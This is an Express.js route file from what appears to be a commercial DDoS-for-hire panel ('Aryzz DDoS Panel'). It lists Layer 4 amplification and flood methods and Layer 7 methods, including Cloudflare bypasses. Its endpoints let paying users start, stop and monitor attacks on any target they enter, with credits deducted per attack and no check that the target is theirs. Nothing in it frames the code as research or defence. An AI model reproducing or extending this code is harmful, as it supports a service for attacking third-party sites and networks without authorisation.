import express from 'express';
import { body, validationResult } from 'express-validator';
import { Attack, Credit, User } from '../../database/models.js';
import { AttackManager } from '../../core/attack-manager.js';
import { ComboAttackManager } from '../../core/combo-attack.js';
import { globalStats } from '../../utils/statistics-tracker.js';

// Define methods manually to avoid import issues
const LAYER4_METHODS = ['UDP', 'TCP', 'SYN', 'VSE', 'TS3', 'MINECRAFT', 'MINECRAFT-BOT', 'NTP-AMP', 'DNS-AMP', 'SSDP-AMP'];
const LAYER7_METHODS = ['GET', 'POST', 'HTTP2', 'HTTP2-POST', 'STRESS', 'NULL', 'DYN', 'SLOW', 'APACHE', 'XMLRPC', 'CFB', 'BYPASS', 'HTTP2-CF', 'HTTP3'];

const router = express.Router();

// Store active attacks
const activeAttacks = new Map();

/**
 * Attack Control Page
 */
router.get('/', async (req, res) => {
    try {
        const allMethods = [...LAYER4_METHODS, ...LAYER7_METHODS];
        
        res.render('attack/control-pro', {
            title: 'Attack Control - Aryzz DDoS Panel',
            user: req.user,
            methods: allMethods,
            layer4Methods: LAYER4_METHODS,
            layer7Methods: LAYER7_METHODS
        });
    } catch (err) {
        console.error('Attack page error:', err);
        res.status(500).render('error', {
            title: 'Error',
            message: 'Failed to load attack control'
        });
    }
});

/**
 * Calculate credit cost
 */
function calculateCreditCost(threads, duration, rpc = 1, isCombo = false, methodCount = 1) {
    const baseCost = Math.ceil((threads / 10) * (duration / 60) * rpc);
    
    if (isCombo) {
        return Math.ceil(baseCost * methodCount * 1.5);
    }
    
    return baseCost;
}

/**
 * Start Attack
 */
router.post('/start',
    [
        body('target').trim().notEmpty().withMessage('Target is required'),
        body('method').trim().notEmpty().withMessage('Method is required'),
        body('threads').isInt({ min: 50, max: 1000 }).withMessage('Threads must be 50-1000'),
        body('duration').isInt({ min: 30, max: 600 }).withMessage('Duration must be 30-600 seconds'),
        body('rpc').isInt({ min: 1, max: 50 }).withMessage('RPC must be 1-50')
    ],
    async (req, res) => {
        try {
            // Validate input
            const errors = validationResult(req);
            if (!errors.isEmpty()) {
                return res.status(400).json({
                    success: false,
                    message: errors.array()[0].msg
                });
            }

            const { target, method, threads, duration, rpc } = req.body;
            const user = req.user;

            // Check if user has active attack
            if (activeAttacks.has(user.id)) {
                return res.status(400).json({
                    success: false,
                    message: 'You already have an active attack. Please wait for it to complete.'
                });
            }

            // Calculate credit cost
            const creditCost = calculateCreditCost(
                parseInt(threads),
                parseInt(duration),
                parseInt(rpc)
            );

            // Check if user has enough credits
            if (user.credits < creditCost) {
                return res.status(403).json({
                    success: false,
                    message: 'Insufficient credits',
                    required: creditCost,
                    available: user.credits
                });
            }

            // Deduct credits
            await Credit.deduct(
                user.id,
                creditCost,
                'attack',
                `Attack: ${method} on ${target}`
            );

            // Create attack record
            const attackRecord = await Attack.create({
                userId: user.id,
                target,
                method,
                threads: parseInt(threads),
                duration: parseInt(duration),
                rpc: parseInt(rpc),
                creditsUsed: creditCost,
                ip: req.ip,
                userAgent: req.headers['user-agent']
            });

            // Start attack
            const attackManager = new AttackManager({
                target,
                method,
                threads: parseInt(threads),
                duration: parseInt(duration),
                rpc: parseInt(rpc),
                proxies: null,
                userAgents: [],
                referers: [],
                enableMonitoring: false
            });

            // Store active attack
            activeAttacks.set(user.id, {
                manager: attackManager,
                attackId: attackRecord.id
            });

            // Start statistics tracking
            globalStats.reset();
            globalStats.start();

            // Start attack
            attackManager.start().then(async () => {
                // Attack completed
                const stats = globalStats.getStats();
                
                await Attack.updateStatus(attackRecord.id, 'completed', {
                    totalRequests: stats.totalRequests,
                    successfulRequests: stats.successfulRequests,
                    blockedRequests: stats.blockedRequests,
                    bypassedRequests: stats.bypassedRequests
                });

                globalStats.stop();
                activeAttacks.delete(user.id);
            }).catch(async (err) => {
                console.error('Attack error:', err);
                await Attack.updateStatus(attackRecord.id, 'failed');
                globalStats.stop();
                activeAttacks.delete(user.id);
            });

            res.json({
                success: true,
                message: 'Attack started successfully',
                attackId: attackRecord.id,
                creditCost,
                remainingCredits: user.credits - creditCost
            });

        } catch (err) {
            console.error('Start attack error:', err);
            res.status(500).json({
                success: false,
                message: 'Failed to start attack: ' + err.message
            });
        }
    }
);

/**
 * Stop Attack
 */
router.post('/stop', async (req, res) => {
    try {
        const user = req.user;
        
        const activeAttack = activeAttacks.get(user.id);
        if (!activeAttack) {
            return res.status(400).json({
                success: false,
                message: 'No active attack found'
            });
        }

        // Stop attack
        await activeAttack.manager.stop();
        
        // Update status
        const stats = globalStats.getStats();
        await Attack.updateStatus(activeAttack.attackId, 'stopped', {
            totalRequests: stats.totalRequests,
            successfulRequests: stats.successfulRequests,
            blockedRequests: stats.blockedRequests,
            bypassedRequests: stats.bypassedRequests
        });

        globalStats.stop();
        activeAttacks.delete(user.id);

        res.json({
            success: true,
            message: 'Attack stopped successfully'
        });

    } catch (err) {
        console.error('Stop attack error:', err);
        res.status(500).json({
            success: false,
            message: 'Failed to stop attack'
        });
    }
});

/**
 * Get Attack Status
 */
router.get('/status', async (req, res) => {
    try {
        const user = req.user;
        
        const activeAttack = activeAttacks.get(user.id);
        if (!activeAttack) {
            return res.json({
                success: true,
                active: false
            });
        }

        const stats = globalStats.getStats();
        const attackRecord = await Attack.findById(activeAttack.attackId);

        res.json({
            success: true,
            active: true,
            attack: attackRecord,
            stats: stats
        });

    } catch (err) {
        console.error('Status error:', err);
        res.status(500).json({
            success: false,
            message: 'Failed to get status'
        });
    }
});

/**
 * Calculate Credit Cost (API)
 */
router.post('/calculate-cost', async (req, res) => {
    try {
        const { threads, duration, rpc, isCombo, methodCount } = req.body;
        
        const cost = calculateCreditCost(
            parseInt(threads) || 100,
            parseInt(duration) || 60,
            parseInt(rpc) || 1,
            isCombo || false,
            parseInt(methodCount) || 1
        );

        res.json({
            success: true,
            cost
        });

    } catch (err) {
        console.error('Calculate cost error:', err);
        res.status(500).json({
            success: false,
            message: 'Failed to calculate cost'
        });
    }
});

export default router;
